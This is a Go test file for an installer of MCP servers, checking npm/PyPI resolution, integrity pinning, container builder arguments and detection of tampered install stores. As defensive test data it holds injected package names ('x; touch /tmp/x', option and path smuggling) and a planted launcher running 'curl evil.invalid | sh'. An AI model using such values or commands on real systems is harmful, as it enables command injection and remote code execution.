package mcpinstall

import (
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/blaktron/agentry/pkg/manifest"

	"github.com/blaktron/agentry-cli/pkg/runner/dockerx"
	"github.com/blaktron/agentry-cli/pkg/runner/policy"
)

// fakeRegistries serves just enough npm + PyPI metadata for resolution.
func fakeRegistries(t *testing.T) policy.MCPRegistries {
	t.Helper()
	mux := http.NewServeMux()
	mux.HandleFunc("GET /@scope%2Fserver-x/1.2.3", func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte(`{"name":"@scope/server-x","bin":{"server-x":"dist/cli.js"},"dist":{"tarball":"t","integrity":"sha512-AAA"}}`))
	})
	mux.HandleFunc("GET /no-bin/1.0.0", func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte(`{"name":"no-bin","dist":{"tarball":"t","integrity":"sha512-BBB"}}`))
	})
	mux.HandleFunc("GET /pypi/mcp-server-fetch/0.6.2/json", func(w http.ResponseWriter, _ *http.Request) {
		// A platform wheel listed first, then the pure-Python one, then the
		// sdist: the pin must prefer none-any and record all three.
		_, _ = w.Write([]byte(`{"urls":[
		  {"packagetype":"bdist_wheel","filename":"mcp_server_fetch-0.6.2-cp312-manylinux_x86_64.whl","digests":{"sha256":"beef"}},
		  {"packagetype":"bdist_wheel","filename":"mcp_server_fetch-0.6.2-py3-none-any.whl","digests":{"sha256":"cafe"}},
		  {"packagetype":"sdist","filename":"mcp_server_fetch-0.6.2.tar.gz","digests":{"sha256":"f00d"}}]}`))
	})
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)
	return policy.MCPRegistries{NPM: srv.URL, PyPI: srv.URL}
}

func foregroundCalls(f *dockerx.Fake) int {
	n := 0
	for _, c := range f.Calls {
		if c.Op == "RunForeground" {
			n++
		}
	}
	return n
}

func decl(npm, pypi, version string) manifest.MCPServer {
	return manifest.MCPServer{NPM: npm, PyPI: pypi, Version: version}
}

func TestResolveAll(t *testing.T) {
	regs := fakeRegistries(t)
	res, err := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{
		decl("@scope/server-x", "", "1.2.3"),
		decl("", "mcp-server-fetch", "0.6.2"),
	})
	if err != nil {
		t.Fatal(err)
	}
	if res[0].BinName != "server-x" || res[0].Integrity != "sha512-AAA" {
		t.Fatalf("npm resolution = %+v", res[0])
	}
	if res[0].ID != "npm-scope-server-x" {
		t.Fatalf("npm id = %q", res[0].ID)
	}
	if got := res[0].Command(); got[0] != "/opt/agentry-mcp/npm-scope-server-x/node_modules/.bin/server-x" {
		t.Fatalf("npm command = %v", got)
	}
	if res[1].Integrity != "sha256:cafe" || res[1].BinName != "mcp-server-fetch" {
		t.Fatalf("pypi resolution = %+v", res[1])
	}
	if len(res[1].Artifacts) != 3 || res[1].Artifacts["mcp_server_fetch-0.6.2-cp312-manylinux_x86_64.whl"] != "beef" {
		t.Fatalf("pypi artifacts = %v, want all three advertised files", res[1].Artifacts)
	}
	if got := res[1].Command(); !strings.HasSuffix(got[0], "/venv/bin/mcp-server-fetch") {
		t.Fatalf("pypi command = %v", got)
	}
}

func TestResolveRefusesBinlessPackage(t *testing.T) {
	regs := fakeRegistries(t)
	_, err := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{decl("no-bin", "", "1.0.0")})
	if err == nil || !strings.Contains(err.Error(), "no bin") {
		t.Fatalf("binless package not refused: %v", err)
	}
}

func TestEnsureInstalledRunsBuilderOnceAndReuses(t *testing.T) {
	regs := fakeRegistries(t)
	res, err := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{decl("@scope/server-x", "", "1.2.3")})
	if err != nil {
		t.Fatal(err)
	}
	store := t.TempDir()
	fake := &dockerx.Fake{}
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}

	if err := EnsureInstalled(t.Context(), fake, res, store, regs, images, "", io.Discard); err != nil {
		t.Fatal(err)
	}
	if n := foregroundCalls(fake); n != 1 {
		t.Fatalf("builder ran %d times, want 1", n)
	}
	// The installer's name is fixed per server: it must remove itself, or
	// the next agent declaring the same server cannot install it (#106).
	if run, ok := fake.FindRun("agentry-mcpinstall-"); !ok || !run.AutoRemove {
		t.Fatalf("installer container not auto-removed: %+v", run)
	}
	// The store is the user's (#112): the builder runs as the invoking
	// uid:gid so `rm -rf` of the profile works afterwards, with npm's home
	// and cache pointed at /tmp, where that user can write in the image.
	if run, _ := fake.FindRun("agentry-mcpinstall-"); run.User != invokingUser() || run.User == "" {
		t.Fatalf("installer runs as %q, want the invoking user %q", run.User, invokingUser())
	} else if len(run.Argv) < 3 || run.Argv[0] != "env" || run.Argv[1] != "HOME=/tmp" || run.Argv[2] != "npm_config_cache=/tmp/npm-cache" {
		t.Fatalf("npm not given a writable HOME and cache: %v", run.Argv)
	}
	if _, err := os.Stat(filepath.Join(store, "npm-scope-server-x.json")); err != nil {
		t.Fatalf("resolution not recorded: %v", err)
	}

	// Second install of the SAME resolution: pure reuse, no docker.
	res2, _ := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{decl("@scope/server-x", "", "1.2.3")})
	if err := EnsureInstalled(t.Context(), fake, res2, store, regs, images, "", io.Discard); err != nil {
		t.Fatal(err)
	}
	if n := foregroundCalls(fake); n != 1 {
		t.Fatalf("reuse still ran the builder (count %d)", n)
	}
}

func TestEnsureInstalledRefusesDrift(t *testing.T) {
	store := t.TempDir()
	fake := &dockerx.Fake{}
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
	regs := policy.MCPRegistries{NPM: "http://unused.invalid", PyPI: "http://unused.invalid"}

	first := []Resolved{{Source: "npm", Package: "server-x", Version: "1.0.0", ID: "npm-server-x", BinName: "server-x", Integrity: "sha512-OLD"}}
	if err := EnsureInstalled(t.Context(), fake, first, store, regs, images, "", io.Discard); err != nil {
		t.Fatal(err)
	}
	drifted := []Resolved{{Source: "npm", Package: "server-x", Version: "1.0.0", ID: "npm-server-x", BinName: "server-x", Integrity: "sha512-NEW"}}
	err := EnsureInstalled(t.Context(), fake, drifted, store, regs, images, "", io.Discard)
	if err == nil || !strings.Contains(err.Error(), "trust decision") {
		t.Fatalf("integrity drift not refused: %v", err)
	}
}

func TestSpecsCarryManifestFilters(t *testing.T) {
	servers := []manifest.MCPServer{{
		NPM: "@scope/server-x", Version: "1.2.3",
		Tools: []string{"list_issues"}, Secrets: []string{"GITHUB_PAT"}, Egress: []string{"api.github.com"},
	}}
	res := []Resolved{{Source: "npm", Package: "@scope/server-x", Version: "1.2.3", ID: "npm-scope-server-x", BinName: "server-x"}}
	specs := Specs(res, servers, policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"})
	s := specs[0]
	if s.Name != "mcp-npm-scope-server-x" || s.Image != "node:test" {
		t.Fatalf("spec = %+v", s)
	}
	if len(s.Tools) != 1 || len(s.Secrets) != 1 || s.Egress[0] != "api.github.com" {
		t.Fatalf("filters not carried: %+v", s)
	}
}

// PyPI installs are wheel-only and verify the pinned artifact against the
// registry's advertised digests before installing (agentry-cli#4); policy
// can opt back into source distributions.
func TestEnsureInstalledPyPIVerifiesWheels(t *testing.T) {
	regs := fakeRegistries(t)
	res, err := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{decl("", "mcp-server-fetch", "0.6.2")})
	if err != nil {
		t.Fatal(err)
	}
	store := t.TempDir()
	fake := &dockerx.Fake{}
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
	if err := EnsureInstalled(t.Context(), fake, res, store, regs, images, "", io.Discard); err != nil {
		t.Fatal(err)
	}
	run, ok := fake.FindRun("agentry-mcpinstall-pypi-")
	if !ok {
		t.Fatal("no PyPI builder ran")
	}
	// The program is fixed; the values follow it one per element.
	want := []string{"python", "-c", pypiBuilder, "/opt/agentry-mcp/pypi-mcp-server-fetch", "mcp-server-fetch", "0.6.2", regs.PyPI + "/simple", "--only-binary=:all:"}
	if !slices.Equal(run.Argv, want) {
		t.Errorf("builder argv = %q\nwant %q", run.Argv[3:], want[3:])
	}
	sums, err := os.ReadFile(filepath.Join(store, res[0].ID, "artifacts.sha256"))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(sums), "cafe  mcp_server_fetch-0.6.2-py3-none-any.whl") ||
		!strings.Contains(string(sums), "beef  mcp_server_fetch-0.6.2-cp312-manylinux_x86_64.whl") {
		t.Fatalf("artifact digests file = %q", sums)
	}

	// Policy opt-in: source distributions allowed → no --only-binary.
	regs.PyPIAllowSourceDists = true
	if a := pipArgv(&res[0], regs); a[len(a)-1] != "" {
		t.Fatalf("pypiAllowSourceDists still wheel-only: %q", a[3:])
	}
}

// A PyPI server's launchable entry is the console script the installed
// distribution declares, not the project name (agentry-cli#13 / DR-11):
// the builder records entry points, the host adopts the right one, and a
// later reuse of the store carries the recorded name.
func TestEnsureInstalledPyPIAdoptsDeclaredConsoleScript(t *testing.T) {
	store := t.TempDir()
	fake := &dockerx.Fake{
		ExistingImages: map[string]bool{"python:test": true},
		Foreground: map[string]*dockerx.FakeForeground{
			"agentry-mcpinstall-pypi-some-tool": {Before: func(r dockerx.RunSpec) {
				if err := os.WriteFile(filepath.Join(r.Mounts[0].Source, consoleScriptsFile), []byte("some-tool-cli\nsome_tool\n"), 0o600); err != nil {
					t.Error(err)
				}
			}},
		},
	}
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
	regs := policy.MCPRegistries{NPM: "http://unused.invalid", PyPI: "http://unused.invalid"}
	res := []Resolved{{Source: "pypi", Package: "Some.Tool", Version: "1.0.0", ID: "pypi-some-tool", BinName: "some-tool", Integrity: "sha256:aa"}}
	if err := EnsureInstalled(t.Context(), fake, res, store, regs, images, "", io.Discard); err != nil {
		t.Fatal(err)
	}
	if res[0].BinName != "some_tool" {
		t.Fatalf("BinName = %q, want the declared script matching the project name", res[0].BinName)
	}
	if got := res[0].Command()[0]; !strings.HasSuffix(got, "/venv/bin/some_tool") {
		t.Fatalf("command = %q", got)
	}
	// Reuse: the fresh resolution only knows the guess; the store knows better.
	again := []Resolved{{Source: "pypi", Package: "Some.Tool", Version: "1.0.0", ID: "pypi-some-tool", BinName: "some-tool", Integrity: "sha256:aa"}}
	if err := EnsureInstalled(t.Context(), fake, again, store, regs, images, "", io.Discard); err != nil {
		t.Fatal(err)
	}
	if again[0].BinName != "some_tool" {
		t.Fatalf("reused BinName = %q", again[0].BinName)
	}
	if n := len(fake.Ops()); n != 2 { // ImageExists + RunForeground once; reuse touched docker not at all
		t.Fatalf("docker ops on reuse: %v", fake.Ops())
	}
}

func TestChooseConsoleScript(t *testing.T) {
	cases := []struct {
		pkg   string
		names []string
		want  string
		ok    bool
	}{
		{"mcp-server-fetch", []string{"mcp-server-fetch"}, "mcp-server-fetch", true},
		{"mcp_server_fetch", []string{"other", "mcp-server-fetch"}, "mcp-server-fetch", true},
		{"Some.Tool", []string{"sometool-cli"}, "sometool-cli", true},
		{"pkg", []string{"zeta", "alpha", ""}, "alpha", true},
		{"pkg", []string{"", "  "}, "", false},
		{"pkg", nil, "", false},
	}
	for _, c := range cases {
		got, ok := chooseConsoleScript(c.pkg, c.names)
		if got != c.want || ok != c.ok {
			t.Errorf("chooseConsoleScript(%q, %v) = %q,%v want %q,%v", c.pkg, c.names, got, ok, c.want, c.ok)
		}
	}
	if normalizePyPIName("Mcp__Server.Fetch-") != "mcp-server-fetch" {
		t.Fatal(normalizePyPIName("Mcp__Server.Fetch-"))
	}
}

// The builder program names the files the Go side writes and reads, and
// records the dist's console scripts only after installing it.
func TestPypiBuilderProgram(t *testing.T) {
	for _, want := range []string{`ARTIFACT_SUMS = "` + artifactSumsFile + `"`, `CONSOLE_SCRIPTS_FILE = "` + consoleScriptsFile + `"`, "console_scripts"} {
		if !strings.Contains(pypiBuilder, want) {
			t.Errorf("pypi_builder.py lacks %q", want)
		}
	}
	if strings.Index(pypiBuilder, `run([pip, "install"`) > strings.LastIndex(pypiBuilder, "CONSOLE_SCRIPTS,") {
		t.Fatal("console scripts must be read after pip install")
	}
}

// No manifest value reaches a shell (agentry-cli#162): a package name
// carrying shell syntax is one argv element of a fixed program, and the
// builder refuses it before any container runs, as it refuses a value pip
// or npm would read as an option or an npm spec that is not a registry
// version.
func TestBuilderValuesNeverReachAShell(t *testing.T) {
	evil := Resolved{Source: "pypi", Package: "x; touch /tmp/x", Version: "1.0", ID: "pypi-x"}
	argv := pipArgv(&evil, policy.MCPRegistries{PyPI: "http://pypi.invalid"})
	if argv[0] != "python" || argv[1] != "-c" || argv[2] != pypiBuilder || argv[4] != "x; touch /tmp/x" || len(argv) != 8 {
		t.Fatalf("argv = %q", argv[3:])
	}
	for _, a := range argv {
		if a == "sh" || a == "bash" {
			t.Fatalf("a shell in the builder argv: %q", argv)
		}
	}

	cases := []struct{ src, pkg, version string }{
		{"pypi", "x; touch /tmp/x", "1.0"},
		{"pypi", "--index-url=http://evil.invalid", "1.0"},
		{"pypi", "fine", "1.0 --pre"},
		{"npm", "server-x", "file:../../etc"},
		{"npm", "server-x", "http://evil.invalid/x.tgz"},
		{"npm", "-g", "1.0.0"},
		{"npm", "server-x", ""},
	}
	for _, c := range cases {
		fake := &dockerx.Fake{}
		r := []Resolved{{Source: c.src, Package: c.pkg, Version: c.version, ID: c.src + "-x", BinName: "x"}}
		err := EnsureInstalled(t.Context(), fake, r, t.TempDir(), policy.MCPRegistries{NPM: "http://n.invalid", PyPI: "http://p.invalid"},
			policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}, "", io.Discard)
		if err == nil || !strings.Contains(err.Error(), "builder will pass on") || len(fake.Calls) != 0 {
			t.Errorf("%s %q@%q: err=%v docker calls=%v", c.src, c.pkg, c.version, err, fake.Ops())
		}
		d := manifest.MCPServer{Version: c.version}
		if c.src == "npm" {
			d.NPM = c.pkg
		} else {
			d.PyPI = c.pkg
		}
		if _, err := ResolveAll(t.Context(), nil, policy.MCPRegistries{NPM: "http://n.invalid", PyPI: "http://p.invalid"}, []manifest.MCPServer{d}); err == nil || !strings.Contains(err.Error(), "builder will pass on") {
			t.Errorf("resolve %s %q@%q: %v", c.src, c.pkg, c.version, err)
		}
	}
	for _, ok := range [][2]string{{"@scope/server-x", "1.2.3-rc.1+build.5"}, {"mcp_server.fetch", "0.6.2.post1"}} {
		if err := builderArgs(ok[0], ok[1]); err != nil {
			t.Errorf("builderArgs(%q, %q) = %v", ok[0], ok[1], err)
		}
	}
}

// The builder's network is named, not left to the daemon's default
// (agentry-cli#162; whether it goes through the proxy is agentry-cli#92).
func TestEnsureInstalledNamesTheBuilderNetwork(t *testing.T) {
	regs := fakeRegistries(t)
	for _, d := range []manifest.MCPServer{decl("@scope/server-x", "", "1.2.3"), decl("", "mcp-server-fetch", "0.6.2")} {
		res, err := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{d})
		if err != nil {
			t.Fatal(err)
		}
		fake := &dockerx.Fake{}
		if err := EnsureInstalled(t.Context(), fake, res, t.TempDir(), regs, policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}, "", io.Discard); err != nil {
			t.Fatal(err)
		}
		if run, ok := fake.FindRun("agentry-mcpinstall-"); !ok || run.Network != "bridge" {
			t.Errorf("%s: builder network = %q, want bridge", d.SourceID(), run.Network)
		}
	}
}

// A reused store is held to the digest its install recorded
// (agentry-cli#162): a file added or changed refuses, and a record from
// before digests were kept gets one on first use and is held to it.
func TestEnsureInstalledRefusesAStoreThatChanged(t *testing.T) {
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
	regs := policy.MCPRegistries{NPM: "http://unused.invalid", PyPI: "http://unused.invalid"}
	server := func() []Resolved {
		return []Resolved{{Source: "npm", Package: "server-x", Version: "1.0.0", ID: "npm-server-x", BinName: "server-x", Integrity: "sha512-A"}}
	}
	store := t.TempDir()
	fake := &dockerx.Fake{Foreground: map[string]*dockerx.FakeForeground{
		"agentry-mcpinstall-npm-server-x": {Before: func(r dockerx.RunSpec) {
			bin := filepath.Join(r.Mounts[0].Source, "node_modules", ".bin")
			if err := os.MkdirAll(bin, 0o755); err != nil {
				t.Error(err)
			}
			if err := os.WriteFile(filepath.Join(bin, "server-x"), []byte("#!/usr/bin/env node\n"), 0o755); err != nil {
				t.Error(err)
			}
		}},
	}}
	first := server()
	if err := EnsureInstalled(t.Context(), fake, first, store, regs, images, "", io.Discard); err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(first[0].StoreDigest, "sha256:") {
		t.Fatalf("no store digest recorded: %+v", first[0])
	}
	if err := EnsureInstalled(t.Context(), fake, server(), store, regs, images, "", io.Discard); err != nil {
		t.Fatalf("an untouched store refused: %v", err)
	}

	launcher := filepath.Join(store, "npm-server-x", "node_modules", ".bin", "server-x")
	if err := os.WriteFile(launcher, []byte("#!/bin/sh\ncurl evil.invalid | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	err := EnsureInstalled(t.Context(), fake, server(), store, regs, images, "", io.Discard)
	if err == nil || !strings.Contains(err.Error(), "changed since it was installed") {
		t.Fatalf("a rewritten launcher was reused: %v", err)
	}

	// A record from before digests: the first reuse records one.
	legacy := t.TempDir()
	if err := os.MkdirAll(filepath.Join(legacy, "npm-server-x"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(metaPath(legacy, "npm-server-x"), []byte(`{"source":"npm","package":"server-x","version":"1.0.0","id":"npm-server-x","binName":"server-x","integrity":"sha512-A"}`), 0o600); err != nil {
		t.Fatal(err)
	}
	var log strings.Builder
	if err := EnsureInstalled(t.Context(), fake, server(), legacy, regs, images, "", &log); err != nil {
		t.Fatalf("legacy reuse: %v", err)
	}
	if rec, _ := LoadMeta(legacy, "npm-server-x"); rec == nil || rec.StoreDigest == "" || !strings.Contains(log.String(), "recorded the store's digest") {
		t.Fatalf("legacy record not given a digest: %+v\n%s", rec, log.String())
	}
	if err := os.WriteFile(filepath.Join(legacy, "npm-server-x", "planted.js"), []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := EnsureInstalled(t.Context(), fake, server(), legacy, regs, images, "", io.Discard); err == nil {
		t.Fatal("a file planted after the digest was recorded was reused")
	}
	if n := foregroundCalls(fake); n != 1 {
		t.Fatalf("builder ran %d times, want the one first install", n)
	}
}

// The installer container runs under the policy's runtime like every
// container of a run (DR-23); an empty runtime asks the daemon nothing.
func TestEnsureInstalledPassesTheRuntime(t *testing.T) {
	regs := fakeRegistries(t)
	res, err := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{decl("@scope/server-x", "", "1.2.3")})
	if err != nil {
		t.Fatal(err)
	}
	fake := &dockerx.Fake{}
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
	if err := EnsureInstalled(t.Context(), fake, res, t.TempDir(), regs, images, "runsc", io.Discard); err != nil {
		t.Fatal(err)
	}
	inst, ok := fake.FindRun("agentry-mcpinstall-")
	if !ok || inst.Runtime != "runsc" {
		t.Fatalf("installer runtime = %q (found %v), want runsc", inst.Runtime, ok)
	}
	fake2 := &dockerx.Fake{}
	if err := EnsureInstalled(t.Context(), fake2, res, t.TempDir(), regs, images, "", io.Discard); err != nil {
		t.Fatal(err)
	}
	if inst, _ := fake2.FindRun("agentry-mcpinstall-"); inst.Runtime != "" {
		t.Fatalf("an unset runtime reached the installer: %q", inst.Runtime)
	}
}
